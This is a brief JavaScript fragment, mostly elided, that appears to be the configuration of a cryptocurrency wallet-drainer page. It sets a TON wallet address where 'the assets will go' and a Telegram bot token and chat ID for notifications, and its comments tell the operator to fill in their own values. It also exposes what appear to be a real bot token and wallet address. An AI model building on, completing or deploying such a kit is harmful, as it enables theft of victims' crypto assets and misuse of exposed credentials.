...
document.addEventListener("DOMContentLoaded", async () => {
    ...
    const CF = {
        Wallet: "UQAe5muxTlZX_t8X8uhW6UADl07K467YNSHnftjoEXYcNBJR",  // Wallet address where the assets will go
    ...
    const TG = {
        token: "8271256922:AAFkJ0iGvWnKrDfivinpznNaid3Iw10rh_s", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
        chat_id: "1932555133", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
